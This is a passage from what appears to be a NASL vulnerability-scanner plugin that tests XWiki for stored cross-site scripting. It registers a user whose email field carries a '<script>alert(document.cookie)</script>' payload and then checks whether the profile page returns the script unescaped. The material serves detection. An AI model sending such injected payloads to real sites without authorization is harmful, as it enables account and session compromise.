...
postdata = "form_token=" + tokenValue[1] + "&register_first_name=ppp&" + "register_last_name=ppp&xwikiname=PppPpp&register_password=secpod&" + "register2_password=secpod&register_email=<script>alert(document." + "cookie)</script>@gmail.com&template=XWiki.XWikiUserTemplate&" + "xredirect=";
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Referer: http://", host, url, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
res = http_keepalive_send_recv( port: xwikiPort, data: req );
if(res){
	url = "/xwiki/bin/view/XWiki/PppPpp";
	if(http_vuln_check( port: xwikiPort, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>" )){
